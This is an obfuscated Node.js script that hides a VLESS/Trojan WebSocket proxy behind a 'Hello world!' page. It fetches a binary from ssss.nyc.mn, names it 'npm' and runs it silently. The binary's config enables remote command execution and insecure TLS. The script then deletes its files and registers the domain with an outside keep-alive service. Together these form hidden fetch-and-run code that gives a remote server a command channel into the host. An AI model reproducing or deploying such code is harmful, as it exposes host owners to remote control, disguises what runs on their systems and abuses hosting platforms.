const _0x4a9b71=_0x19e9;(function(_0x2469f7,_0x2cd9c6){const _0x918965=_0x19e9,_0x2e82b5=_0x2469f7();while(!![]){try{const _0x14decd=parseInt(_0x918965(0x166))/0x1+parseInt(_0x918965(0x188))/0x2*(parseInt(_0x918965(0x16f))/0x3)+-parseInt(_0x918965(0x1a9))/0x4+-parseInt(_0x918965(0x163))/0x5+parseInt(_0x918965(0x177))/0x6+-parseInt(_0x918965(0x14f))/0x7*(parseInt(_0x918965(0x168))/0x8)+parseInt(_0x918965(0x18e))/0x9;if(_0x14decd===_0x2cd9c6)break;else _0x2e82b5['push'](_0x2e82b5['shift']());}catch(_0x194961){_0x2e82b5['push'](_0x2e82b5['shift']());}}}(_0x573e,0xb9f1c));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x4a9b71(0x175)),net=require(_0x4a9b71(0x199)),path=require(_0x4a9b71(0x1ad)),crypto=require(_0x4a9b71(0x19a)),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x4a9b71(0x156)][_0x4a9b71(0x147)]||'32e765b9-1dbd-4280-8766-a5f09eb53524',NEZHA_SERVER=process[_0x4a9b71(0x156)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x4a9b71(0x156)][_0x4a9b71(0x170)]||'',NEZHA_KEY=process['env'][_0x4a9b71(0x1ae)]||'',DOMAIN=process['env'][_0x4a9b71(0x171)]||_0x4a9b71(0x1a7),AUTO_ACCESS=process['env'][_0x4a9b71(0x16d)]||!![],WSPATH=process[_0x4a9b71(0x156)][_0x4a9b71(0x183)]||UUID[_0x4a9b71(0x1a8)](0x0,0x8),SUB_PATH=process[_0x4a9b71(0x156)][_0x4a9b71(0x18c)]||_0x4a9b71(0x1a6),NAME=process[_0x4a9b71(0x156)]['NAME']||'',PORT=process[_0x4a9b71(0x156)][_0x4a9b71(0x15d)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x228d45=_0x4a9b71;try{const _0x25deae=await axios['get'](_0x228d45(0x1b3)),_0x36805b=_0x25deae[_0x228d45(0x192)];ISP=(_0x36805b[_0x228d45(0x187)]+'-'+_0x36805b['isp'])[_0x228d45(0x197)](/ /g,'_');}catch(_0x353308){ISP=_0x228d45(0x1ab);}};GetISP();const httpServer=http[_0x4a9b71(0x1b1)]((_0x4542f8,_0x57f625)=>{const _0x258a39=_0x4a9b71;if(_0x4542f8[_0x258a39(0x17d)]==='/'){const _0x1397e9=path[_0x258a39(0x14b)](__dirname,'index.html');fs['readFile'](_0x1397e9,_0x258a39(0x1ac),(_0x31a144,_0x21f377)=>{const _0x5cd74f=_0x258a39;if(_0x31a144){_0x57f625[_0x5cd74f(0x153)](0xc8,{'Content-Type':'text/html'}),_0x57f625[_0x5cd74f(0x198)](_0x5cd74f(0x1a2));return;}_0x57f625[_0x5cd74f(0x153)](0xc8,{'Content-Type':_0x5cd74f(0x1b4)}),_0x57f625[_0x5cd74f(0x198)](_0x21f377);});return;}else{if(_0x4542f8['url']==='/'+SUB_PATH){const _0x8128f3=NAME?NAME+'-'+ISP:ISP,_0x32bd1e='vless://'+UUID+'@'+DOMAIN+_0x258a39(0x1b6)+DOMAIN+_0x258a39(0x148)+DOMAIN+_0x258a39(0x154)+WSPATH+'#'+_0x8128f3,_0x5701ec=_0x258a39(0x17b)+UUID+'@'+DOMAIN+_0x258a39(0x151)+DOMAIN+_0x258a39(0x148)+DOMAIN+_0x258a39(0x154)+WSPATH+'#'+_0x8128f3,_0x291b87=_0x32bd1e+'\x0a'+_0x5701ec,_0x289ead=Buffer[_0x258a39(0x16a)](_0x291b87)[_0x258a39(0x182)](_0x258a39(0x173));_0x57f625[_0x258a39(0x153)](0xc8,{'Content-Type':'text/plain'}),_0x57f625[_0x258a39(0x198)](_0x289ead+'\x0a');}else _0x57f625['writeHead'](0x194,{'Content-Type':_0x258a39(0x18d)}),_0x57f625['end']('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x4a9b71(0x162))]({'server':httpServer}),uuid=UUID[_0x4a9b71(0x197)](/-/g,''),DNS_SERVERS=[_0x4a9b71(0x185),_0x4a9b71(0x176)];function resolveHost(_0x407cd3){return new Promise((_0x671451,_0x47b893)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x407cd3)){_0x671451(_0x407cd3);return;}let _0x19738e=0x0;function _0x1e49cf(){const _0x6f6a98=_0x19e9;if(_0x19738e>=DNS_SERVERS[_0x6f6a98(0x169)]){_0x47b893(new Error('Failed\x20to\x20resolve\x20'+_0x407cd3+_0x6f6a98(0x145)));return;}const _0x3085ad=DNS_SERVERS[_0x19738e];_0x19738e++;const _0x54ee06=_0x6f6a98(0x15c)+encodeURIComponent(_0x407cd3)+_0x6f6a98(0x164);axios[_0x6f6a98(0x155)](_0x54ee06,{'timeout':0x1388,'headers':{'Accept':_0x6f6a98(0x16b)}})['then'](_0x1ef492=>{const _0x5d9d25=_0x6f6a98,_0x2e7337=_0x1ef492['data'];if(_0x2e7337[_0x5d9d25(0x174)]===0x0&&_0x2e7337[_0x5d9d25(0x18f)]&&_0x2e7337[_0x5d9d25(0x18f)][_0x5d9d25(0x169)]>0x0){const _0x3ff096=_0x2e7337[_0x5d9d25(0x18f)][_0x5d9d25(0x14a)](_0x8fb191=>_0x8fb191[_0x5d9d25(0x144)]===0x1);if(_0x3ff096){_0x671451(_0x3ff096[_0x5d9d25(0x192)]);return;}}_0x1e49cf();})[_0x6f6a98(0x19f)](_0x47efcd=>{_0x1e49cf();});}_0x1e49cf();});}function _0x573e(){const _0x19c2f8=['https://api.ip.sb/geoip','text/html','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&',':443?encryption=none&security=tls&sni=','sha224','createHash','arch','split','trim','/bin/bash','https://amd64.ssss.nyc.mn/v1','write','finish','type','\x20with\x20all\x20DNS\x20servers','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','UUID','&fp=chrome&type=ws&host=','npm\x20is\x20running','find','join','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','config.yaml','105ylOVJr','hex',':443?security=tls&sni=','digest','writeHead','&path=%2F','get','env','true','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','connect','2053','utf-8','https://dns.google/resolve?name=','PORT','map','once','message','arm','Server','555790JlGAog','&type=A','arm64','1268130lOtPGa','\x20-p\x20','302584hzpNbm','length','from','application/dns-json','npm','AUTO_ACCESS','writeFileSync','10578oigciN','NEZHA_PORT','DOMAIN','npm\x20download\x20successfully','base64','Status','axios','1.1.1.1','379044CnrdAc','Server\x20is\x20running\x20on\x20port\x20','concat','false','trojan://','includes','url','client_secret:\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','connection','log','toString','WSPATH','error','8.8.4.4','close','country_code','598cBjYMX','substr','setsid\x20nohup\x20./npm\x20-s\x20','reduce','SUB_PATH','text/plain','289305RTZywg','Answer','Automatic\x20Access\x20Task\x20added\x20successfully','decode','data','2083','2096','stream','npm\x20running\x20error:','replace','end','net','crypto','every','readUInt16BE','application/json','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','catch','https://','2087','Hello\x20world!','readUInt8','https://arm64.ssss.nyc.mn/agent','createWriteStream','sub','1234.abc.com','slice','3910368GkEqfp','send','Unknown','utf8','path','NEZHA_KEY','error:\x20','chmod\x20+x\x20npm','createServer','pipe'];_0x573e=function(){return _0x19c2f8;};return _0x573e();}function handleVlessConnection(_0x898b76,_0x8e30ce){const _0x563c30=_0x4a9b71,[_0x5e46b2]=_0x8e30ce,_0x216df2=_0x8e30ce[_0x563c30(0x1a8)](0x1,0x11);if(!_0x216df2[_0x563c30(0x19b)]((_0x2324b1,_0xf794b4)=>_0x2324b1==parseInt(uuid[_0x563c30(0x189)](_0xf794b4*0x2,0x2),0x10)))return![];let _0x3bb731=_0x8e30ce[_0x563c30(0x1a8)](0x11,0x12)[_0x563c30(0x1a3)]()+0x13;const _0x43b498=_0x8e30ce['slice'](_0x3bb731,_0x3bb731+=0x2)[_0x563c30(0x19c)](0x0),_0x21ac39=_0x8e30ce[_0x563c30(0x1a8)](_0x3bb731,_0x3bb731+=0x1)[_0x563c30(0x1a3)](),_0x4fdc43=_0x21ac39==0x1?_0x8e30ce[_0x563c30(0x1a8)](_0x3bb731,_0x3bb731+=0x4)[_0x563c30(0x14b)]('.'):_0x21ac39==0x2?new TextDecoder()[_0x563c30(0x191)](_0x8e30ce[_0x563c30(0x1a8)](_0x3bb731+0x1,_0x3bb731+=0x1+_0x8e30ce[_0x563c30(0x1a8)](_0x3bb731,_0x3bb731+0x1)[_0x563c30(0x1a3)]())):_0x21ac39==0x3?_0x8e30ce['slice'](_0x3bb731,_0x3bb731+=0x10)[_0x563c30(0x18b)]((_0x13127a,_0x5d2998,_0x1fc4e6,_0x4a651c)=>_0x1fc4e6%0x2?_0x13127a[_0x563c30(0x179)](_0x4a651c[_0x563c30(0x1a8)](_0x1fc4e6-0x1,_0x1fc4e6+0x1)):_0x13127a,[])['map'](_0x19acb4=>_0x19acb4[_0x563c30(0x19c)](0x0)[_0x563c30(0x182)](0x10))[_0x563c30(0x14b)](':'):'';_0x898b76[_0x563c30(0x1aa)](new Uint8Array([_0x5e46b2,0x0]));const _0x1e4f34=createWebSocketStream(_0x898b76);return resolveHost(_0x4fdc43)['then'](_0x3ed865=>{const _0xf73535=_0x563c30;net[_0xf73535(0x159)]({'host':_0x3ed865,'port':_0x43b498},function(){const _0x18ce58=_0xf73535;this[_0x18ce58(0x142)](_0x8e30ce['slice'](_0x3bb731)),_0x1e4f34['on'](_0x18ce58(0x184),()=>{})[_0x18ce58(0x1b2)](this)['on'](_0x18ce58(0x184),()=>{})[_0x18ce58(0x1b2)](_0x1e4f34);})['on'](_0xf73535(0x184),()=>{});})[_0x563c30(0x19f)](_0x4a0218=>{const _0x4d4e71=_0x563c30;net['connect']({'host':_0x4fdc43,'port':_0x43b498},function(){const _0x3718be=_0x19e9;this[_0x3718be(0x142)](_0x8e30ce['slice'](_0x3bb731)),_0x1e4f34['on'](_0x3718be(0x184),()=>{})['pipe'](this)['on'](_0x3718be(0x184),()=>{})[_0x3718be(0x1b2)](_0x1e4f34);})['on'](_0x4d4e71(0x184),()=>{});}),!![];}function handleTrojanConnection(_0x2d2f35,_0x277d87){const _0x523cf0=_0x4a9b71;try{if(_0x277d87['length']<0x3a)return![];const _0x5c07a7=_0x277d87[_0x523cf0(0x1a8)](0x0,0x38)[_0x523cf0(0x182)](),_0x2ef2c4=[UUID];let _0x393df6=null;for(const _0x146571 of _0x2ef2c4){const _0x338151=crypto[_0x523cf0(0x13c)](_0x523cf0(0x1b7))['update'](_0x146571)[_0x523cf0(0x152)](_0x523cf0(0x150));if(_0x338151===_0x5c07a7){_0x393df6=_0x146571;break;}}if(!_0x393df6)return![];let _0x14b056=0x38;_0x277d87[_0x14b056]===0xd&&_0x277d87[_0x14b056+0x1]===0xa&&(_0x14b056+=0x2);const _0xaa5bad=_0x277d87[_0x14b056];if(_0xaa5bad!==0x1)return![];_0x14b056+=0x1;const _0x25eb77=_0x277d87[_0x14b056];_0x14b056+=0x1;let _0x159892,_0x15fcdf;if(_0x25eb77===0x1)_0x159892=_0x277d87['slice'](_0x14b056,_0x14b056+0x4)['join']('.'),_0x14b056+=0x4;else{if(_0x25eb77===0x3){const _0x43074c=_0x277d87[_0x14b056];_0x14b056+=0x1,_0x159892=_0x277d87[_0x523cf0(0x1a8)](_0x14b056,_0x14b056+_0x43074c)[_0x523cf0(0x182)](),_0x14b056+=_0x43074c;}else{if(_0x25eb77===0x4)_0x159892=_0x277d87[_0x523cf0(0x1a8)](_0x14b056,_0x14b056+0x10)[_0x523cf0(0x18b)]((_0x43687d,_0x46db36,_0x179497,_0x368ec0)=>_0x179497%0x2?_0x43687d[_0x523cf0(0x179)](_0x368ec0[_0x523cf0(0x1a8)](_0x179497-0x1,_0x179497+0x1)):_0x43687d,[])[_0x523cf0(0x15e)](_0x3bc2d2=>_0x3bc2d2['readUInt16BE'](0x0)['toString'](0x10))[_0x523cf0(0x14b)](':'),_0x14b056+=0x10;else return![];}}_0x15fcdf=_0x277d87[_0x523cf0(0x19c)](_0x14b056),_0x14b056+=0x2;_0x14b056<_0x277d87[_0x523cf0(0x169)]&&_0x277d87[_0x14b056]===0xd&&_0x277d87[_0x14b056+0x1]===0xa&&(_0x14b056+=0x2);const _0x1f743f=createWebSocketStream(_0x2d2f35);return resolveHost(_0x159892)['then'](_0x23f4eb=>{const _0x42f9c5=_0x523cf0;net[_0x42f9c5(0x159)]({'host':_0x23f4eb,'port':_0x15fcdf},function(){const _0x2eac38=_0x42f9c5;_0x14b056<_0x277d87[_0x2eac38(0x169)]&&this[_0x2eac38(0x142)](_0x277d87['slice'](_0x14b056)),_0x1f743f['on'](_0x2eac38(0x184),()=>{})['pipe'](this)['on']('error',()=>{})[_0x2eac38(0x1b2)](_0x1f743f);})['on'](_0x42f9c5(0x184),()=>{});})['catch'](_0x12a300=>{const _0xb54b12=_0x523cf0;net['connect']({'host':_0x159892,'port':_0x15fcdf},function(){const _0x47b342=_0x19e9;_0x14b056<_0x277d87['length']&&this[_0x47b342(0x142)](_0x277d87['slice'](_0x14b056)),_0x1f743f['on']('error',()=>{})['pipe'](this)['on'](_0x47b342(0x184),()=>{})['pipe'](_0x1f743f);})['on'](_0xb54b12(0x184),()=>{});}),!![];}catch(_0x24c5ee){return![];}}wss['on'](_0x4a9b71(0x180),(_0xb85d0a,_0x50ba02)=>{const _0x4cba7f=_0x4a9b71,_0x42b948=_0x50ba02[_0x4cba7f(0x17d)]||'';_0xb85d0a[_0x4cba7f(0x15f)](_0x4cba7f(0x160),_0x5e6bfd=>{const _0x3d3655=_0x4cba7f;if(_0x5e6bfd[_0x3d3655(0x169)]>0x11&&_0x5e6bfd[0x0]===0x0){const _0x4a1324=_0x5e6bfd[_0x3d3655(0x1a8)](0x1,0x11),_0x549b94=_0x4a1324[_0x3d3655(0x19b)]((_0x51d74a,_0x99494c)=>_0x51d74a==parseInt(uuid['substr'](_0x99494c*0x2,0x2),0x10));if(_0x549b94){!handleVlessConnection(_0xb85d0a,_0x5e6bfd)&&_0xb85d0a[_0x3d3655(0x186)]();return;}}!handleTrojanConnection(_0xb85d0a,_0x5e6bfd)&&_0xb85d0a['close']();})['on'](_0x4cba7f(0x184),()=>{});});function _0x19e9(_0x230bfb,_0x247f2d){_0x230bfb=_0x230bfb-0x13c;const _0x573eef=_0x573e();let _0x19e957=_0x573eef[_0x230bfb];return _0x19e957;}const getDownloadUrl=()=>{const _0x4ff9fb=_0x4a9b71,_0x3bd067=os[_0x4ff9fb(0x13d)]();return _0x3bd067===_0x4ff9fb(0x161)||_0x3bd067===_0x4ff9fb(0x165)||_0x3bd067==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x4ff9fb(0x1a4):!NEZHA_PORT?_0x4ff9fb(0x141):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x45ec4b=_0x4a9b71;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x8d2b10=getDownloadUrl(),_0x186eed=await axios({'method':_0x45ec4b(0x155),'url':_0x8d2b10,'responseType':_0x45ec4b(0x195)}),_0x259171=fs[_0x45ec4b(0x1a5)]('npm');return _0x186eed[_0x45ec4b(0x192)][_0x45ec4b(0x1b2)](_0x259171),new Promise((_0x5dd3be,_0x3259ca)=>{const _0x356ceb=_0x45ec4b;_0x259171['on'](_0x356ceb(0x143),()=>{const _0x18ba21=_0x356ceb;console[_0x18ba21(0x181)](_0x18ba21(0x172)),exec(_0x18ba21(0x1b0),_0x21ce27=>{if(_0x21ce27)_0x3259ca(_0x21ce27);_0x5dd3be();});}),_0x259171['on'](_0x356ceb(0x184),_0x3259ca);});}catch(_0x515463){throw _0x515463;}},runnz=async()=>{const _0x4f41be=_0x4a9b71;try{const _0x373aac=execSync(_0x4f41be(0x146),{'encoding':_0x4f41be(0x15b)});if(_0x373aac[_0x4f41be(0x13f)]()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x265cf7){}await downloadFile();let _0x574d52='',_0x19b515=['443','8443',_0x4f41be(0x194),_0x4f41be(0x1a1),_0x4f41be(0x193),_0x4f41be(0x15a)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x19111b=_0x19b515[_0x4f41be(0x17c)](NEZHA_PORT)?'--tls':'';_0x574d52=_0x4f41be(0x18a)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4f41be(0x167)+NEZHA_KEY+'\x20'+_0x19111b+_0x4f41be(0x17f);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4119ee=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x4f41be(0x13e)](':')['pop']():'',_0x518aa2=_0x19b515[_0x4f41be(0x17c)](_0x4119ee)?_0x4f41be(0x157):_0x4f41be(0x17a),_0x3e08a5=_0x4f41be(0x17e)+NEZHA_KEY+_0x4f41be(0x158)+NEZHA_SERVER+_0x4f41be(0x19e)+_0x518aa2+_0x4f41be(0x14c)+UUID;fs[_0x4f41be(0x16e)](_0x4f41be(0x14e),_0x3e08a5);}_0x574d52=_0x4f41be(0x1b5);}else{console[_0x4f41be(0x181)](_0x4f41be(0x14d));return;}}try{exec(_0x574d52,{'shell':_0x4f41be(0x140)},_0x27b683=>{const _0x4dc1e8=_0x4f41be;if(_0x27b683)console[_0x4dc1e8(0x184)](_0x4dc1e8(0x196),_0x27b683);else console[_0x4dc1e8(0x181)](_0x4dc1e8(0x149));});}catch(_0x5bdb48){console['error'](_0x4f41be(0x1af)+_0x5bdb48);}};async function addAccessTask(){const _0x228694=_0x4a9b71;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2ff322=_0x228694(0x1a0)+DOMAIN;try{const _0x2b5e0a=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x2ff322},{'headers':{'Content-Type':_0x228694(0x19d)}});console[_0x228694(0x181)](_0x228694(0x190));}catch(_0x4b133e){}}const delFiles=()=>{const _0x45f759=_0x4a9b71;fs['unlink'](_0x45f759(0x16c),()=>{}),fs['unlink'](_0x45f759(0x14e),()=>{});};httpServer['listen'](PORT,()=>{const _0x368bb4=_0x4a9b71;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x368bb4(0x181)](_0x368bb4(0x178)+PORT);});
